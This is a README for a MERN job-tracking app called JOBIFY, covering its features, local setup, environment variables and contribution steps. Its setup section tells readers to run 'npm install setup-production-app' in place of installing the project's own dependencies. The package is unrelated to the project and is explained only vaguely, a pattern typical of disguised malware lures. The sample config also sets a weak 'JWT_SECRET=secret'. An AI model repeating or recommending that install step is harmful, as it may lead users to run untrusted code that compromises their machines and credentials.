# 🌟 JOBIFY Website 🌟

🌐[Live Link](https://jobify-app-3edf.onrender.com/)

### 📌 Description:

JOBIFY is a full-stack MERN project designed to simplify job tracking and management for users. The application integrates a React-powered frontend, a Node.js backend, and MongoDB as the database for robust and efficient data storage.

## 🔧 Tech Stack

- 🚀 Frontend:

  - React.js 🌐
  - CSS Modules / SCSS 🎨

- 🖥️ Backend:

  - Node.js 🔄
  - Express.js ⚡

- 🗄️ Database:

  - MongoDB 🐘

- 🛠️ Tools & Libraries:
  - Axios 📨
  - JWT Authentication 🔒
  - Mongoose 📊

---

### 📸 Features

1. ✅ User Authentication:

- Secure login/signup system with JWT.

2. ✅ Job Tracking:

- Add, edit, and delete job applications effortlessly.

3. ✅ Dashboard:

- Intuitive and interactive interface for managing jobs.

4. ✅ Search & Filters:

- Quickly find job listings using advanced filters and search options.

5. ✅ Responsive Design:

- Mobile-friendly and optimized for all devices.

---

## 🚀 How to Run Locally

**Clone the Repository:**

```bash

# clone the repo
git clone https://github.com/MastooraTurkmen/my-client-app.git

# Go inside the repo
cd my-client-app

```

**Install Dependencies and Run Locally:**

```bash
npm install setup-production-app
```

This command uses the setup-production-app package, which helps configure and optimize the application for production. It ensures that all required packages and configurations are correctly set up for running the app efficiently in a local environment.

```bash
node server
```

**Setup MongoDb URL and CLoudinary**
To ensure the application runs correctly, you need to configure the necessary environment variables for database connectivity and media management.

**1. Create a `.env` File:**

- In the root directory of your project, create a file named `.env` and add the following configuration:

  ```plaintext
  NODE_ENV=development
  PORT=5100
  MONGO_URL=mongodb+srv:<YOUR SECRET URL >
  JWT_SECRET=secret
  JWT_EXPIRES_IN=1d
  CLOUD_NAME=<YOUR CLOUDINARY NAME >
  CLOUD_API_KEY=<YOUR CLOUDINARY API Key >
  CLOUD_API_SECRET=<YOUR CLOUDINARY API SECRET>
  ```

**2. Configure MongoDB:**

- Replace `<YOUR SECRET URL>` with your MongoDB connection string.
- Example:

  ```plaintext
  MONGO_URL=mongodb+srv://username:password@cluster.mongodb.net/database-name
  ```

- Use **_MongoDB Atlas_** (cloud-based) or a local MongoDB server for database connectivity.

📌 **Tip:** Make sure to whitelist your IP address in MongoDB Atlas and secure your credentials.

**3. Configure Cloudinary:**

- Replace `<YOUR CLOUDINARY NAME>`, `<YOUR CLOUDINARY API Key>`, and `<YOUR CLOUDINARY API SECRET>` with your **Cloudinary** account details.
- You can get these values by signing up at [Cloudinary](https://cloudinary.com/) and creating a new project.

**4. Why These Variables Are Important:**

- `MONGO_URL`: Connects your application to the database for storing and retrieving data.
- `JWT_SECRET`: Secures JSON Web Tokens (JWT) for user authentication.
- `CLOUD_NAME`, `CLOUD_API_KEY`, `CLOUD_API_SECRET`: Enables Cloudinary to manage image uploads and transformations.

---

### ✨ Live Demo

🔗 [Visit the Jobify Website](https://jobify-app-3edf.onrender.com/)

---

### 🛠️ Contributing

Contributions are welcome! 🎉

1. Fork the repository.
2. Create your feature branch:

```bash
git checkout -b feature-name
```

3. Commit your changes:

```bash
git commit -m "Add new feature"
```

4. Push to the branch:

```bash
git push origin feature-name
```

5. Open a Pull Request. 🚀

### 📬 Contact

💻 **Developer**: Mastoora Turkmen
📧 **Email**: mastooraturkmen@gmail.com
🌟 If you like this project, please give it a ⭐ on [GitHub](https://github.com/MastooraTurkmen/my-client-app)!
